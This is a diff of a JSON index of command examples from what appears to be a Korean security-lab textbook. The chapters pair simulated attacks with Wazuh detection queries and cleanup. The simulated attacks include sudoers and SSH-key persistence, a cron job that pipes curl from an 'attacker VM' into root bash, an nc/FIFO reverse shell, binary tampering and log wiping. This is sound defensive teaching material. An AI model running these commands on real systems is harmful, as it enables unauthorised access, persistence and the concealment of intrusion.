+    "text": "agent.name: \"bastion\" AND rule.groups: \"syscheck\" AND syscheck.path: \"/etc/sudoers.d/99-book09-lab\""
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "추가와 수정 기록 구분",
+    "id": "C09-10",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-10.txt",
+    "text": "printf '%s\\n' '# book09 checked' | \\\nsudo tee -a /etc/sudoers.d/99-book09-lab\nsudo visudo -c"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "추가와 수정 기록 구분",
+    "id": "Q09-02",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter09/Q09-02.txt",
+    "text": "agent.name: \"bastion\" AND syscheck.path: \"/etc/sudoers.d/99-book09-lab\" AND syscheck.event: \"modified\""
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "조사와 원상복구",
+    "id": "C09-11",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-11.txt",
+    "text": "sudo cat /etc/sudoers.d/99-book09-lab\nsudo rm /etc/sudoers.d/99-book09-lab\nls -l /etc/sudoers.d/99-book09-lab\nsudo visudo -c\nsudo -l"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.3  SSH 공개 키 등록",
+    "id": "C09-12",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-12.txt",
+    "text": "ls -ld ~/book09\ncommand -v ssh-keygen"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.3  SSH 공개 키 등록",
+    "id": "C09-13",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-13.txt",
+    "text": "mkdir ~/book09\nls -l ~/book09/book09_key*"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "키 생성과 서버의 기존 상태 보존",
+    "id": "C09-14",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-14.txt",
+    "text": "ssh-keygen -t ed25519 -N '' \\\n-C book09@attacker -f ~/book09/book09_key\nssh-keygen -lf ~/book09/book09_key.pub\ncat ~/book09/book09_key.pub"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "키 생성과 서버의 기존 상태 보존",
+    "id": "C09-15",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-15.txt",
+    "text": "ls -ld /home/ccc/.ssh\nls -l /home/ccc/.ssh/authorized_keys\nls -l /root/book09-authorized_keys.before\nstat -c \"%a %U %G %n\" \\\n/home/ccc/.ssh /home/ccc/.ssh/authorized_keys"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "키 생성과 서버의 기존 상태 보존",
+    "id": "C09-16",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-16.txt",
+    "text": "cp -p /home/ccc/.ssh/authorized_keys \\\n/root/book09-authorized_keys.before\nsha256sum /home/ccc/.ssh/authorized_keys \\\n/root/book09-authorized_keys.before"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "키 생성과 서버의 기존 상태 보존",
+    "id": "C09-17",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-17.txt",
+    "text": "install -d -m 700 -o ccc -g ccc /home/ccc/.ssh\ninstall -m 600 -o ccc -g ccc /dev/null \\\n/home/ccc/.ssh/authorized_keys\nls -ld /home/ccc/.ssh\nls -l /home/ccc/.ssh/authorized_keys"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "공개 키 한 줄 추가와 접속",
+    "id": "C09-18",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-18.txt",
+    "text": "cat >> /home/ccc/.ssh/authorized_keys"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "공개 키 한 줄 추가와 접속",
+    "id": "C09-19",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-19.txt",
+    "text": "tail -n 1 /home/ccc/.ssh/authorized_keys\nstat -c \"%a %U %G %n\" \\\n/home/ccc/.ssh/authorized_keys"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "공개 키 한 줄 추가와 접속",
+    "id": "C09-20",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-20.txt",
+    "text": "ssh -p 2204 -i ~/book09/book09_key \\\n-o IdentitiesOnly=yes -o BatchMode=yes \\\n-o PreferredAuthentications=publickey \\\nccc@192.168.0.107 'hostname; id'"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "파일 변경과 인증 성공 연결",
+    "id": "Q09-03",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter09/Q09-03.txt",
+    "text": "agent.name: \"bastion\" AND rule.groups: \"syscheck\" AND syscheck.path: \"/home/ccc/.ssh/authorized_keys\""
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "파일 변경과 인증 성공 연결",
+    "id": "Q09-04",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter09/Q09-04.txt",
+    "text": "agent.name: \"bastion\" AND rule.id: \"5715\" AND data.dstuser: \"ccc\" AND data.srcip: \"192.168.0.108\" AND full_log: \"Accepted publickey\""
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "키 제거와 원상복구 확인",
+    "id": "C09-21",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-21.txt",
+    "text": "sha256sum /root/book09-authorized_keys.before\ncp -p /root/book09-authorized_keys.before \\\n/home/ccc/.ssh/authorized_keys\ncmp /root/book09-authorized_keys.before \\\n/home/ccc/.ssh/authorized_keys\nprintf \"cmp status=%s\\n\" \"$?\""
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "키 제거와 원상복구 확인",
+    "id": "C09-22",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-22.txt",
+    "text": "ls -l /home/ccc/.ssh/authorized_keys\nrm /home/ccc/.ssh/authorized_keys\nls -l /home/ccc/.ssh/authorized_keys"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "키 제거와 원상복구 확인",
+    "id": "C09-23",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-23.txt",
+    "text": "stat -c \"%a %U %G %n\" \\\n/home/ccc/.ssh/authorized_keys\nrm /root/book09-authorized_keys.before\nls -l /root/book09-authorized_keys.before"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.4  cron 예약 작업",
+    "id": "C09-24",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-24.txt",
+    "text": "command -v cron\ncommand -v curl\nservice cron status\nls -l /etc/cron.d/book09-lab \\\n/tmp/book09-cron-result"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.4  cron 예약 작업",
+    "id": "C09-25",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-25.txt",
+    "text": "apt-get update\napt-get install -y --no-install-recommends cron\ncommand -v cron"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "제공할 스크립트 준비",
+    "id": "C09-26",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-26.txt",
+    "text": "command -v python3\nls -ld ~/book09/www\nmkdir ~/book09/www"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "제공할 스크립트 준비",
+    "id": "C09-27",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-27.txt",
+    "text": "cat > ~/book09/www/x.sh <<'EOF'\n#!/bin/sh\nprintf \"book09-cron user=%s host=%s\\n\" \\\n\"$(id -un)\" \"$(hostname)\" >> /tmp/book09-cron-result\nEOF\ncat ~/book09/www/x.sh"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "제공할 스크립트 준비",
+    "id": "C09-28",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-28.txt",
+    "text": "ss -ltn 'sport = :8000'\npython3 -m http.server 8000 \\\n--bind 192.168.0.108 --directory /home/att/book09/www"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "예약 파일 등록",
+    "id": "C09-29",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-29.txt",
+    "text": "curl -fsS --max-time 5 \\\nhttp://192.168.0.108:8000/x.sh"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "예약 파일 등록",
+    "id": "C09-30",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-30.txt",
+    "text": "service cron start\nservice cron status"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "예약 파일 등록",
+    "id": "C09-31",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-31.txt",
+    "text": "printf '%s\\n' \\\n'* * * * * root /usr/bin/curl -fsS --max-time 5 http://192.168.0.108:8000/x.sh | /bin/bash' \\\n| sudo tee /etc/cron.d/book09-lab\nsudo chmod 0644 /etc/cron.d/book09-lab\ncat /etc/cron.d/book09-lab"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "등록 경보와 실행 결과",
+    "id": "Q09-05",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter09/Q09-05.txt",
+    "text": "agent.name: \"bastion\" AND syscheck.path: \"/etc/cron.d/book09-lab\""
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "등록 경보와 실행 결과",
+    "id": "C09-32",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-32.txt",
+    "text": "date -Is\nls -l /tmp/book09-cron-result\ncat /tmp/book09-cron-result"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "예약 제거와 원상복구",
+    "id": "C09-33",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-33.txt",
+    "text": "cat /etc/cron.d/book09-lab\nsudo rm /etc/cron.d/book09-lab\nls -l /etc/cron.d/book09-lab"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "예약 제거와 원상복구",
+    "id": "C09-34",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-34.txt",
+    "text": "cat /tmp/book09-cron-result\nsudo rm /tmp/book09-cron-result\nls -l /tmp/book09-cron-result"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "예약 제거와 원상복구",
+    "id": "C09-35",
+    "where": "kt66-bastion · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-35.txt",
+    "text": "service cron stop\nservice cron status"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.5  리버스 셸과 호스트 감사",
+    "id": "C09-36",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-36.txt",
+    "text": "hostname\ncat /proc/self/loginuid\nsudo systemctl is-active auditd wazuh-agent\nsudo auditctl -s\nsudo auditctl -l"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "수집 상태 점검과 서비스 복구",
+    "id": "C09-37",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-37.txt",
+    "text": "sudo /var/ossec/bin/wazuh-control status\nsudo grep -n -A 4 -B 2 \\\n'audit' /var/ossec/etc/ossec.conf\nsudo tail -n 20 /var/ossec/logs/ossec.log"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "수집 상태 점검과 서비스 복구",
+    "id": "C09-38",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-38.txt",
+    "text": "sudo wc -l /var/ossec/etc/client.keys\nsudo grep -n -A 5 '<server>' \\\n/var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "수집 상태 점검과 서비스 복구",
+    "id": "C09-39",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-39.txt",
+    "text": "sudo /var/ossec/bin/agent-auth \\\n-m 10.20.32.100 -A kt66-host\nsudo systemctl start wazuh-agent\nsudo /var/ossec/bin/wazuh-control status"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "연결 도구와 FIFO 준비",
+    "id": "C09-40",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-40.txt",
+    "text": "command -v nc\nnc -h"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "연결 도구와 FIFO 준비",
+    "id": "C09-41",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-41.txt",
+    "text": "command -v nc\nreadlink -f /usr/bin/nc\nls -l /tmp/book09.fifo"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "연결 도구와 FIFO 준비",
+    "id": "C09-42",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-42.txt",
+    "text": "ss -ltn 'sport = :4444'\ntimeout 90s nc -lvn 192.168.0.108 4444"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "입력과 응답 확인",
+    "id": "C09-43",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-43.txt",
+    "text": "mkfifo /tmp/book09.fifo\nls -l /tmp/book09.fifo"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "입력과 응답 확인",
+    "id": "C09-44",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-44.txt",
+    "text": "cat /tmp/book09.fifo | bash -i 2>&1 | \\\nnc -N 192.168.0.108 4444 > /tmp/book09.fifo"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "입력과 응답 확인",
+    "id": "C09-45",
+    "where": "공격자 VM · nc 연결 창",
+    "file": "examples/rev02/chapter09/C09-45.txt",
+    "text": "hostname\nid\nexit"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "입력과 응답 확인",
+    "id": "C09-46",
+    "where": "kt66 VM · 연결 종료 후 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-46.txt",
+    "text": "ls -l /tmp/book09.fifo\nrm /tmp/book09.fifo\nls -l /tmp/book09.fifo\nss -tn 'dport = :4444'"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "nc 실행 경보 해석",
+    "id": "Q09-06",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter09/Q09-06.txt",
+    "text": "agent.name: \"kt66-host\" AND rule.groups: \"audit_command\" AND data.audit.execve.a0: \"nc\""
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "부모 프로세스와 Sysmon 보강",
+    "id": "Q09-07",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter09/Q09-07.txt",
+    "text": "agent.name: \"kt66-host\" AND rule.groups: \"audit_command\" AND data.audit.session: \"82\" AND (data.audit.pid: \"172435\" OR data.audit.ppid: \"172435\")"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "부모 프로세스와 Sysmon 보강",
+    "id": "C09-47",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-47.txt",
+    "text": "sudo ausearch -if /var/log/audit/audit.log \\\n-a 6630 -i"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "부모 프로세스와 Sysmon 보강",
+    "id": "C09-48",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-48.txt",
+    "text": "sudo journalctl -t sysmon \\\n--since \"2026-11-03 07:52:25\" \\\n--until \"2026-11-03 07:52:28\" --no-pager | \\\ngrep -F '172438'"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.6  다운로드한 응답을 셸로 실행",
+    "id": "C09-49",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-49.txt",
+    "text": "ls -l ~/book09/www/a.sh\ncat > ~/book09/www/a.sh <<'EOF'\n#!/bin/sh\nprintf \"book09-payload user=%s host=%s\\n\" \\\n\"$(id -un)\" \"$(hostname)\"\nEOF\ncat ~/book09/www/a.sh"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.6  다운로드한 응답을 셸로 실행",
+    "id": "C09-50",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-50.txt",
+    "text": "curl -fsS --max-time 5 \\\nhttp://192.168.0.108:8000/a.sh"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "실행 결과와 두 명령의 상태",
+    "id": "C09-51",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-51.txt",
+    "text": "curl -fsS --max-time 5 \\\nhttp://192.168.0.108:8000/a.sh | sh\nprintf \"curl and sh status: %s\\n\" \"${PIPESTATUS[*]}\""
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "실행 결과와 두 명령의 상태",
+    "id": "Q09-08",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter09/Q09-08.txt",
+    "text": "agent.name: \"kt66-host\" AND rule.groups: \"audit_command\" AND data.audit.execve.a0: \"curl\""
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "curl과 sh의 부모 프로세스",
+    "id": "Q09-09",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter09/Q09-09.txt",
+    "text": "agent.name: \"kt66-host\" AND rule.groups: \"audit_command\" AND data.audit.session: \"87\" AND (data.audit.pid: \"172868\" OR data.audit.ppid: \"172868\")"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "HTTP 서버와 임시 키 정리",
+    "id": "C09-52",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-52.txt",
+    "text": "ss -ltn 'sport = :8000 or sport = :4444'\nls -l ~/book09/book09_key ~/book09/book09_key.pub \\\n~/book09/www/x.sh ~/book09/www/a.sh"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "HTTP 서버와 임시 키 정리",
+    "id": "C09-53",
+    "where": "공격자 VM · att 셸",
+    "file": "examples/rev02/chapter09/C09-53.txt",
+    "text": "rm ~/book09/book09_key ~/book09/book09_key.pub \\\n~/book09/www/x.sh ~/book09/www/a.sh\nrmdir ~/book09/www ~/book09\nls -ld ~/book09"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.7  실행 파일 변조",
+    "id": "C09-54",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-54.txt",
+    "text": "docker exec -it kt66-web /bin/bash"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.7  실행 파일 변조",
+    "id": "C09-55",
+    "where": "kt66-web · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-55.txt",
+    "text": "hostname\nls -l /usr/bin/yes /root/book09-yes.before\nstat -c \"%s %a %U %G %n\" /usr/bin/yes\nsha256sum /usr/bin/yes\ndpkg -S /usr/bin/yes"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.7  실행 파일 변조",
+    "id": "C09-56",
+    "where": "kt66-web · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-56.txt",
+    "text": "dpkg -V coreutils"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "백업과 7바이트 변경",
+    "id": "C09-57",
+    "where": "kt66-web · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-57.txt",
+    "text": "cp -p /usr/bin/yes /root/book09-yes.before\ncmp /usr/bin/yes /root/book09-yes.before\nprintf \"cmp status=%s\\n\" \"$?\"\nsha256sum /root/book09-yes.before"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "백업과 7바이트 변경",
+    "id": "C09-58",
+    "where": "kt66-web · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-58.txt",
+    "text": "printf '\\x00BOOK09' >> /usr/bin/yes\nstat -c '%s %a %U %G %n' /usr/bin/yes\nsha256sum /usr/bin/yes\ndpkg -V coreutils"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "Wazuh의 변경 전후 값",
+    "id": "Q09-10",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter09/Q09-10.txt",
+    "text": "agent.name: \"web\" AND rule.id: \"550\" AND syscheck.path: \"/usr/bin/yes\""
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "바이너리 원상복구",
+    "id": "C09-59",
+    "where": "kt66-web · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-59.txt",
+    "text": "sha256sum /root/book09-yes.before\ncp -p /root/book09-yes.before /usr/bin/yes\ncmp /root/book09-yes.before /usr/bin/yes\nprintf \"cmp status=%s\\n\" \"$?\"\nstat -c \"%s %a %U %G %n\" /usr/bin/yes\nsha256sum /usr/bin/yes"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "바이너리 원상복구",
+    "id": "C09-60",
+    "where": "kt66-web · root 관리 셸",
+    "file": "examples/rev02/chapter09/C09-60.txt",
+    "text": "dpkg -V coreutils | grep -F -- '/usr/bin/yes'\nrm /root/book09-yes.before\nls -l /root/book09-yes.before\nexit"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.8  로그 삭제와 내용 비우기",
+    "id": "C09-61",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-61.txt",
+    "text": "ls -ld /home/ccc/book09-history\nls -l /var/log/book09-btmp /var/log/btmp\nsudo sha256sum /var/log/btmp"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "감시할 실습 파일 준비",
+    "id": "C09-62",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-62.txt",
+    "text": "mkdir -m 700 /home/ccc/book09-history\nprintf '%s\\n' 'echo book09-history' \\\n> /home/ccc/book09-history/.bash_history\nsudo cp -p /var/log/btmp /var/log/book09-btmp\nls -l /home/ccc/book09-history/.bash_history \\\n/var/log/book09-btmp"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "감시할 실습 파일 준비",
+    "id": "C09-63",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-63.txt",
+    "text": "cat /home/ccc/book09-history/.bash_history\n> /home/ccc/book09-history/.bash_history\nsudo rm /var/log/book09-btmp\nstat -c \"%s %n\" \\\n/home/ccc/book09-history/.bash_history\nls -l /var/log/book09-btmp"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "삭제 경보와 크기 변경 경보",
+    "id": "Q09-11",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter09/Q09-11.txt",
+    "text": "agent.name: \"bastion\" AND rule.id: \"553\" AND syscheck.path: \"/var/log/book09-btmp\""
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "삭제 경보와 크기 변경 경보",
+    "id": "Q09-12",
+    "where": "Windows · Discover · wazuh-alerts-*",
+    "file": "examples/rev02/chapter09/Q09-12.txt",
+    "text": "agent.name: \"bastion\" AND syscheck.path: \"/home/ccc/book09-history/.bash_history\" AND syscheck.event: \"modified\""
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "정상 회전과 훼손 조사",
+    "id": "C09-64",
+    "where": "kt66-bastion · SSH로 접속한 ccc 셸",
+    "file": "examples/rev02/chapter09/C09-64.txt",
+    "text": "sudo sha256sum /var/log/btmp\ncat /home/ccc/book09-history/.bash_history\nrm /home/ccc/book09-history/.bash_history\nrmdir /home/ccc/book09-history\nls -ld /home/ccc/book09-history /var/log/book09-btmp"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.9  디코더와 탐지 규칙 확인",
+    "id": "C09-65",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter09/C09-65.txt",
+    "text": "docker exec -it kt66-siem /bin/bash"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.9  디코더와 탐지 규칙 확인",
+    "id": "C09-66",
+    "where": "kt66-siem · root 셸",
+    "file": "examples/rev02/chapter09/C09-66.txt",
+    "text": "sed -n \\\n-e '/<rule id=\"550\"/,/<\\/rule>/p' \\\n-e '/<rule id=\"553\"/,/<\\/rule>/p' \\\n-e '/<rule id=\"554\"/,/<\\/rule>/p' \\\n/var/ossec/ruleset/rules/0015-ossec_rules.xml"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "9.9  디코더와 탐지 규칙 확인",
+    "id": "C09-67",
+    "where": "kt66-siem · root 셸",
+    "file": "examples/rev02/chapter09/C09-67.txt",
+    "text": "sed -n '/<rule id=\"591\"/,/<\\/rule>/p' \\\n/var/ossec/ruleset/rules/0015-ossec_rules.xml"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "audit 디코더·규칙·분류 키",
+    "id": "C09-68",
+    "where": "kt66-siem · root 셸",
+    "file": "examples/rev02/chapter09/C09-68.txt",
+    "text": "sed -n '/<rule id=\"80792\"/,/<\\/rule>/p' \\\n/var/ossec/ruleset/rules/0365-auditd_rules.xml\ncat /var/ossec/etc/lists/audit-keys"
+  },
+  {
+    "document": "volume01-chapter09.json",
+    "section": "audit 디코더·규칙·분류 키",
+    "id": "C09-69",
+    "where": "kt66-siem · root 셸",
+    "file": "examples/rev02/chapter09/C09-69.txt",
+    "text": "grep -n -A 8 -B 2 -E \\\n'auditd-syscall|auditd-execve|<order>audit[.]exe' \\\n/var/ossec/ruleset/decoders/0040-auditd_decoders.xml\nexit"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.1  조사 대상과 실행 위치",
+    "id": "C10-01",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-01.txt",
+    "text": "hostname\ndate -Is\ncommand -v nc ss netstat osqueryi\nsystemctl is-active wazuh-agent osqueryd"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.2  수집 준비와 사전 기록",
+    "id": "C10-02",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-02.txt",
+    "text": "ls -ld ~/book10-state\nsudo ls -l /etc/osquery\nsystemctl is-enabled osqueryd wazuh-agent\nsudo iptables -S INPUT\nsudo iptables -S KT66-PERIMETER"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.2  수집 준비와 사전 기록",
+    "id": "C10-03",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-03.txt",
+    "text": "mkdir -m 700 ~/book10-state\nsudo cp -p /var/ossec/etc/ossec.conf \\\n~/book10-state/ossec.conf.before\nsudo sha256sum /var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "osquery 예약 조회 준비",
+    "id": "C10-04",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-04.txt",
+    "text": "sudo cat /etc/osquery/osquery.conf\ncat ~/kt66/deployment/osquery-linux.conf"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "osquery 예약 조회 준비",
+    "id": "C10-05",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-05.txt",
+    "text": "sudo install -m 0644 \\\n~/kt66/deployment/osquery-linux.conf \\\n/etc/osquery/osquery.conf\nsudo osqueryi \\\n--config_path=/etc/osquery/osquery.conf --config_check"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "Wazuh 수집 설정 확인",
+    "id": "C10-06",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-06.txt",
+    "text": "sudo sed -n '/<wodle name=\"osquery\">/,/<\\/wodle>/p' \\\n/var/ossec/etc/ossec.conf\nsudo grep -n -F '/var/log/kern.log' \\\n/var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "Wazuh 수집 설정 확인",
+    "id": "C10-07",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-07.txt",
+    "text": "sudo nano /var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "수집 항목과 적용 확인",
+    "id": "C10-08",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-08.txt",
+    "text": "sudo /var/ossec/bin/wazuh-logcollector -t\nsudo /var/ossec/bin/wazuh-modulesd -t\nsudo systemctl start osqueryd\nsudo systemctl restart wazuh-agent\nsystemctl is-active osqueryd wazuh-agent"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "결과 파일과 조회 주기",
+    "id": "C10-09",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-09.txt",
+    "text": "sudo tail -n 3 /var/log/osquery/osqueryd.results.log\nsudo grep -n -E \\\n'netstat|<alias>|<frequency>' \\\n/var/ossec/etc/ossec.conf"
+  },
+  {
+    "document": "volume01-chapter10.json",
+    "section": "10.3  TCP 리스너 실행",
+    "id": "C10-10",
+    "where": "kt66 VM · ccc 호스트 셸",
+    "file": "examples/rev02/chapter10/C10-10.txt",
+    "text": "sudo ss -lntp 'sport = :31337'"
+  },
+  {
